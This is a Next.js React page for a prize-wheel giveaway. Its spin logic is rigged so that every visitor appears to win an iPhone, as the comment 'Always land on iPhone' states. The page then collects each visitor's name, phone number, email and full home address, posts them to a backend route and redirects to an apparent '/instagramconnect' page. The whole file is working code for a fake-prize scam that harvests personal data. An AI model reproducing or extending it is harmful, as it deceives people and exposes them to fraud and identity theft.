"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function SpinPage() {
  const [spinning, setSpinning] = useState(false);
  const [winner, setWinner] = useState(null);
  const [showForm, setShowForm] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const router = useRouter();
  const prizes = [
    "iPhone 17 Pro Max",
    "Headset",
    "$500 Voucher",
    "No Gift",
    "Spec",
    "T-Shirt",
    "Headset 2",
    "Amazon Gift",
  ];

  const colors = [
    "#facc15",
    "#ef4444",
    "#22c55e",
    "#3b82f6",
    "#ec4899",
    "#a855f7",
    "#14b8a6",
    "#f97316",
  ];

  const handleSpin = () => {
    if (spinning) return;
    setSpinning(true);
    setWinner(null);
    setShowForm(false);
    setSubmitted(false);

    // Always land on iPhone (index 0)
    const prizeIndex = 0;
    const slice = 360 / prizes.length;
    const stopAngle = 360 * 5 - prizeIndex * slice - slice / 2;

    const wheel = document.getElementById("wheel");
    if (wheel) {
      wheel.animate(
        [{ transform: "rotate(0deg)" }, { transform: `rotate(${stopAngle}deg)` }],
        {
          duration: 4000,
          easing: "ease-out",
          fill: "forwards",
        }
      );
    }

    setTimeout(() => {
      setWinner(prizes[prizeIndex]);
      setSpinning(false);
    }, 4000);
  };

  const radius = 150;
  const sliceAngle = 360 / prizes.length;

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = {
    fullName: e.target[0].value,
    mobile: e.target[1].value,
    email: e.target[2].value,
    house: e.target[3].value,
    street: e.target[4].value,
    landmark: e.target[5].value,
    district: e.target[6].value,
    pincode: e.target[7].value,
    state: e.target[8].value,
  };

  try {
    const res = await fetch("/api/address", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    if (res.ok) {
      setSubmitted(true);
    } else {
      alert("❌ Error submitting address");
    }
  } catch (err) {
    console.error(err);
    alert("❌ Something went wrong");
  }
};
    
  
  

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-b from-purple-600 to-indigo-700 p-4 text-white">
      {!winner ? (
        <>
          {/* Wheel */}
          <div className="relative">
            <svg
              id="wheel"
              width={radius * 2}
              height={radius * 2}
              viewBox={`0 0 ${radius * 2} ${radius * 2}`}
              className="border-4 border-white rounded-full"
            >
              {prizes.map((prize, i) => {
                const startAngle = i * sliceAngle;
                const endAngle = (i + 1) * sliceAngle;
                const largeArc = endAngle - startAngle > 180 ? 1 : 0;

                const x1 = radius + radius * Math.cos((Math.PI * startAngle) / 180);
                const y1 = radius + radius * Math.sin((Math.PI * startAngle) / 180);
                const x2 = radius + radius * Math.cos((Math.PI * endAngle) / 180);
                const y2 = radius + radius * Math.sin((Math.PI * endAngle) / 180);

                const pathData = `
                  M ${radius} ${radius}
                  L ${x1} ${y1}
                  A ${radius} ${radius} 0 ${largeArc} 1 ${x2} ${y2}
                  Z
                `;

                const midAngle = startAngle + sliceAngle / 2;
                const lx =
                  radius + (radius * 0.65) * Math.cos((Math.PI * midAngle) / 180);
                const ly =
                  radius + (radius * 0.65) * Math.sin((Math.PI * midAngle) / 180);

                return (
                  <g key={i}>
                    <path d={pathData} fill={colors[i % colors.length]} stroke="white" />
                    <text
                      x={lx}
                      y={ly}
                      textAnchor="middle"
                      dominantBaseline="middle"
                      fontSize="12"
                      fontWeight="bold"
                      fill="black"
                      transform={`rotate(${midAngle}, ${lx}, ${ly})`}
                    >
                      {prize}
                    </text>
                  </g>
                );
              })}
            </svg>

            {/* Pointer */}
            <div className="absolute top-[-20px] left-1/2 -translate-x-1/2 w-0 h-0 border-l-[15px] border-r-[15px] border-b-[25px] border-l-transparent border-r-transparent border-b-red-500" />
          </div>

          {/* Spin button */}
          <button
            onClick={handleSpin}
            disabled={spinning}
            className="mt-6 bg-green-500 hover:bg-green-600 disabled:opacity-50 px-6 py-3 rounded-full font-bold text-lg"
          >
            {spinning ? "Spinning..." : "Spin 🎡"}
          </button>
        </>
      ) : (
        <div className="text-center animate-fadeIn">
          {/* Winning message */}
          <h1 className="text-3xl font-bold mb-4 animate-bounce">
            🎉 Congratulations! 🎉
          </h1>
          <p className="text-xl mb-6">You won: {winner}</p>

          {/* Show form button */}
          {!showForm && !submitted && (
            <button
              onClick={() => setShowForm(true)}
              className="bg-yellow-400 text-black px-6 py-3 rounded-full font-bold"
            >
              Enter Delivery Address
            </button>
          )}

          {/* Address Form */}
          {showForm && !submitted && (
            <form
              onSubmit={handleSubmit}
              className="mt-6 bg-white text-black p-4 rounded-lg shadow-md space-y-3 max-w-sm mx-auto"
            >
              <input className="w-full p-2 border rounded" placeholder="Full Name" required />
              <input className="w-full p-2 border rounded" placeholder="Mobile Number" required />
              <input type="email" className="w-full p-2 border rounded" placeholder="Email Address" required />
              <input className="w-full p-2 border rounded" placeholder="House No / Name" required />
              <input className="w-full p-2 border rounded" placeholder="Street" required />
              <input className="w-full p-2 border rounded" placeholder="Landmark" />
              <input className="w-full p-2 border rounded" placeholder="District" required />
              <input className="w-full p-2 border rounded" placeholder="Pin Code" required />
              <input className="w-full p-2 border rounded" placeholder="State" required />

              <button
                type="submit"
                className="w-full bg-green-500 text-white py-2 rounded font-bold hover:bg-green-600"
              >
                Submit
              </button>
            </form>
          )}

          {/* Success message */}
          {submitted && (
            <div className="mt-6 animate-fadeIn">
              <h2 className="text-2xl font-bold text-green-300 mb-4">
                ✅ Delivery address successfully submitted!
              </h2>
              <p className="mb-6">
                We will update the details soon through the given email ID.
              </p>
              <a
                onClick={()=>{router.push('/instagramconnect')}}
                target="_blank"
                rel="noopener noreferrer"
                className="bg-pink-500 text-white px-6 py-3 rounded-full font-bold hover:bg-pink-600"
              >
                Connect with our Instagram Handle
              </a>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
